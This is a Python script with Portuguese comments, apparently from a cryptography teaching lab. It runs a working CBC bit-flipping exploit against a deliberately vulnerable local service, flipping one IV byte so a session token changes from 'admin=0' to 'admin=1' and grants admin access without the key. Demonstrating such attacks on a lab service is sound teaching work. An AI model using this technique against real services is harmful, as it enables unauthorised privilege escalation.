"""
Ataque de bit-flipping contra o servico CBC vulneravel.

Ideia: o atacante faz login como usuario comum (admin=0) e, sem decifrar
nada, altera 1 byte do IV. Como o primeiro bloco em CBC e
P1 = D(C1) XOR IV, essa alteracao muda exatamente 1 byte do texto
decifrado correspondente, virando "admin=0" em "admin=1".

Rodar (com vulnerable/service.py ja rodando em outro terminal):
    python attacks/bitflip.py

Opcoes:
    python attacks/bitflip.py --base-url http://127.0.0.1:5000 --usuario ana
"""

from __future__ import annotations

import argparse
from typing import Any

import requests

BLOCK_SIZE = 16
DEFAULT_BASE_URL = "http://127.0.0.1:5000"
DEFAULT_TIMEOUT = 5.0
DEFAULT_USUARIO = "ana"

PLAINTEXT_PREFIX = b"admin=0;usuario="
ADMIN_OFFSET = PLAINTEXT_PREFIX.index(b"0")
ADMIN_FLIP = ord("0") ^ ord("1")


def login(
    session: requests.Session,
    base_url: str,
    usuario: str,
    timeout: float,
) -> bytes:
    """Faz login e devolve o token CBC em bytes."""
    response = session.post(
        f"{base_url}/login",
        json={"usuario": usuario},
        timeout=timeout,
    )
    response.raise_for_status()

    try:
        token_hex = response.json()["token"]
    except (KeyError, ValueError) as exc:
        raise RuntimeError(f"Resposta de login invalida: {response.text}") from exc

    try:
        return bytes.fromhex(token_hex)
    except ValueError as exc:
        raise RuntimeError("O token de login nao esta em hexadecimal") from exc


def profile(
    session: requests.Session,
    base_url: str,
    token: bytes,
    timeout: float,
) -> dict[str, Any]:
    """Envia o token para /profile e devolve a resposta JSON."""
    response = session.post(
        f"{base_url}/profile",
        json={"token": token.hex()},
        timeout=timeout,
    )
    response.raise_for_status()

    try:
        payload = response.json()
    except ValueError as exc:
        raise RuntimeError(f"Resposta de perfil invalida: {response.text}") from exc

    if not isinstance(payload, dict):
        raise RuntimeError(f"Resposta de perfil inesperada: {payload!r}")
    return payload


def flip_admin_flag(token: bytes) -> bytes:
    """
    Altera o byte do IV que controla o campo admin.

    O ciphertext nao e modificado. Apenas o IV muda, entao o primeiro
    bloco decifrado tambem muda na posicao correspondente.
    """
    if len(token) < 2 * BLOCK_SIZE or len(token) % BLOCK_SIZE != 0:
        raise ValueError("Token CBC invalido")

    iv = bytearray(token[:BLOCK_SIZE])
    if ADMIN_OFFSET >= len(iv):
        raise ValueError("Offset do campo admin fora do IV")

    iv[ADMIN_OFFSET] ^= ADMIN_FLIP
    return bytes(iv) + token[BLOCK_SIZE:]


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Executa o ataque de bit-flipping contra o servico CBC.",
    )
    parser.add_argument(
        "--base-url",
        default=DEFAULT_BASE_URL,
        help=f"URL do servico (padrao: {DEFAULT_BASE_URL})",
    )
    parser.add_argument(
        "--usuario",
        default=DEFAULT_USUARIO,
        help=f"Usuario usado no login (padrao: {DEFAULT_USUARIO})",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Timeout das requisicoes em segundos (padrao: {DEFAULT_TIMEOUT})",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    base_url = args.base_url.rstrip("/")

    with requests.Session() as session:
        token = login(session, base_url, args.usuario, args.timeout)
        print(f"[1] Token original recebido ({len(token)} bytes): {token.hex()}")

        baseline = profile(session, base_url, token, args.timeout)
        print(f"[2] Resposta SEM ataque: {baseline}")
        if "admin=0" not in baseline.get("sessao", ""):
            print("[!] O token inicial nao contem admin=0. O ataque pode falhar.")

        token_malicioso = flip_admin_flag(token)
        print(f"[3] Token ALTERADO (1 byte do IV mudou): {token_malicioso.hex()}")

        resultado = profile(session, base_url, token_malicioso, args.timeout)
        print(f"[4] Resposta COM ataque: {resultado}")

    if resultado.get("mensagem", "").startswith("ACESSO ADMIN"):
        print("\n[SUCESSO] Bit-flipping funcionou: virou admin sem conhecer a chave!")
        return 0

    print("\n[FALHOU] O ataque nao conseguiu elevar o privilegio.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
